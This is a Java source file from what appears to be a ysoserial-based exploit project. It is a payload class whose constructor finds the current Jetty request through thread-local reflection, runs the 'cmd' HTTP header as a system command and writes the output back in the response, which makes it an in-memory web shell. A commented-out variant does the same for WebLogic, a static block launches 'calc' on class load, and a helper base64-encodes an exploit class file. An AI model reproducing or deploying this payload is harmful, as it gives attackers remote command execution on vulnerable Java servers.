package ysoserial;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Cqq {
    public static void main(String[] args) throws Exception {
//        System.out.println("test Cqq!");
//        Class.forName("ysoserial.Cqq");

        test();


//        weblogic.work.WorkAdapter adapter = ((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork();
//        java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
//        field.setAccessible(true);
//        Object obj = field.get(adapter);
//        weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj);
//        String cmd = req.getHeader("cmd");
//        if(cmd != null && !cmd.isEmpty()){
//            String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//            weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
//            res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
//            res.getServletOutputStream().flush();
//            res.getWriter().write("");
//        }
    }

    static{
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void test() throws Exception{
        String classFile = "D:\\repos\\dubbo_poc\\ExploitWin.class";

        byte[] bytes  = Files.readAllBytes(Paths.get(classFile));

        String value = new sun.misc.BASE64Encoder().encodeBuffer(bytes);

        System.out.println(value);
    }

    public Cqq() throws Exception{
        /* Thread.currentThread().threadLocals */
        //获取当前线程对象
        Thread thread = Thread.currentThread();
        //获取Thread中的threadLocals对象
        Field threadLocals = Thread.class.getDeclaredField("threadLocals");
        threadLocals.setAccessible(true);
        //ThreadLocalMap是ThreadLocal中的一个内部类，并且访问权限是default
        // 这里获取的是ThreadLocal.ThreadLocalMap
        Object threadLocalMap = threadLocals.get(thread);

        /* ThreadLocal.ThreadLocalMap */
        Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
        //获取ThreadLocalMap中的Entry对象
        Field tableField = threadLocalMapClazz.getDeclaredField("table");
        tableField.setAccessible(true);

        Object[] objects = (Object[]) tableField.get(threadLocalMap);


        /* ThreadLocal.ThreadLocalMap.Entry */
        Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        //获取ThreadLocalMap中的Entry中的value字段
        Field entryValueField = entryClass.getDeclaredField("value");
        entryValueField.setAccessible(true);

        for (Object obj: objects) {
            if(obj!=null){
                // org.eclipse.jetty.server.HttpConnection
                Object httpConnection = entryValueField.get(obj);
                if(httpConnection.getClass().getName().endsWith("HttpConnection")){
                    // org.eclipse.jetty.server.HttpChannelOverHttp
                    Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);

                    // org.eclipse.jetty.server.Request
                    Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
                    String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"cmd"});

                    // org.eclipse.jetty.server.Response
                    Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);

                    // 控制HTTP响应的Writer
                    PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);

                    // 构造命令执行的输入输出环境
                    StringBuilder stringBuilder = new StringBuilder();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));
                    String line;
                    while((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line).append("\n");
                    }
                    String res = stringBuilder.toString();

                    writer.write(res);
                    writer.close();
                }
            }
        }
    }

}
